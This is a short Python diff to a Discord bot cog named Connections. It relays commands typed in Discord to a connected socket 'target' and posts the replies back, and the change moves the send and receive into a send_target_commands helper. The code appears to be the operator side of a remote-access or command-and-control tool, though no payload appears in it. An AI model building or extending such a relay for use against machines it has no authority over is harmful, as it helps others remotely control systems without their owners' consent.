@@ -1,5 +1,5 @@
 from discord.ext import commands
-from src.server.socket_server import list_connections, get_target 
+from src.server.socket_server import list_connections, get_target, send_target_commands 
 
 CONNECTED = []
 
@@ -52,15 +52,13 @@ class Connections(commands.Cog):
                     await ctx.send(f"[!] Disconnected from {conn}")
                     CONNECTED = ''
                     return
-                if len(str.encode(cmd)) > 0:
-                    conn.send(str.encode(cmd))
-                    client_response = str(conn.recv(1024), "utf-8")
+                else:
+                    client_response = send_target_commands(cmd, conn)
                     await ctx.send(f"{client_response}")
                     print(client_response, end="")
-                    return client_response
             except:
                 await ctx.send(f"[!] No clients connected")
-    
+
 
 async def setup(bot):
     await bot.add_cog(Connections(bot)) 
